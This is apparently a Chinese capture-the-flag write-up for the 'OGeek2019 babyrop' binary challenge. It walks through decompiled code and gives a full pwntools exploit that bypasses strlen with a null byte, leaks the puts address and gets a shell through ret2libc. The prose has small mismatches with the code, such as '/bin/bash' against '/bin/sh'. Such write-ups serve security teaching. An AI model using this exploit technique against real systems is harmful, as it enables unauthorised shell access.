# [OGeek2019] babyrop

## 保护

32位程序，开启了NX

```bash
$ checksec --file=pwn
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```



## main函数

```c
int __cdecl main()
{
  int buf; // [esp+4h] [ebp-14h] BYREF
  char v2; // [esp+Bh] [ebp-Dh]
  int fd; // [esp+Ch] [ebp-Ch]

  sub_80486BB();
  fd = open("/dev/urandom", 0);
  if ( fd > 0 )
    read(fd, &buf, 4u);
  v2 = sub_804871F(buf);
  sub_80487D0(v2);
  return 0;
}
```

- `sub_80486BB();`：初始化的，没啥用。
- `fd = open("/dev/urandom", 0); if ( fd > 0 ) read(fd, &buf, 4u);`：获取一个随机数给到`buf`



## sub_804871F函数

```c
int __cdecl sub_804871F(int a1)
{
  size_t v1; // eax
  char s[32]; // [esp+Ch] [ebp-4Ch] BYREF
  char buf[32]; // [esp+2Ch] [ebp-2Ch] BYREF
  ssize_t v5; // [esp+4Ch] [ebp-Ch]

  memset(s, 0, sizeof(s));
  memset(buf, 0, sizeof(buf));
  sprintf(s, "%ld", a1);
  v5 = read(0, buf, 0x20u);
  buf[v5 - 1] = 0;
  v1 = strlen(buf);
  if ( strncmp(buf, s, v1) )
    exit(0);
  write(1, "Correct\n", 8u);
  return (unsigned __int8)buf[7];
}
```

- v6 = read(0, buf, 0x20u);：从键盘读入数据赋值给buf。
- v1 = strlen(buf)：获取buf的长赋值给v1。
- if ( strncmp(buf, &s, v1) ) exit(0);：比较buf和s是否相同，比较位数是v1，不同则结束运行。
- return v5;：返回一个v5。



## sub_80487D0函数

```C
ssize_t __cdecl sub_80487D0(char a1)
{
  char buf[231]; // [esp+11h] [ebp-E7h] BYREF

  if ( a1 == 127 )
    return read(0, buf, 0xC8u);
  else
    return read(0, buf, a1);
}
```

- 传入参数是`sub_804871F()`的返回值。
- `if ( a1 == 0x7F )`：判断`a1`，做出不同长度的输入



## EXP

思路：

- 通过`\x00`绕过`strlen()`使得`sub_804871F()`的返回值`v5`为`\xFF`

- 接着泄露`puts()`的地址
- 获取到地址之后就可以计算`system()`和`/bin/bash`
- 再次利用栈溢出可getshell



```python
from pwn import *

p=process('./pwn')
elf=ELF('./pwn')
libc=ELF('./libc-2.23.so')

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main_addr=0x8048825

payload1=b'\x00'+b'a'*6+b'\xFF'
p.sendline(payload1)
p.recvuntil("Correct\n")

payload2=b'a'*(0x7E+4)+p32(puts_plt)+p32(main_addr)+p32(puts_got)
p.sendline(payload2)

puts_addr=u32(p.recv()[0:4])
print("puts_addr=",hex(puts_addr))

p.sendline(payload1)
p.recvuntil("Correct\n")

base_addr=puts_addr-libc.symbols['puts']
sys_addr=base_addr+libc.symbols['system']
bin_sh_addr=base_addr+next(libc.search(b'/bin/sh'))

payload3=b'a'*(0x7E+4)+p32(sys_addr)+b'a'*4+p32(bin_sh_addr)
p.sendline(payload3)

p.interactive()
```

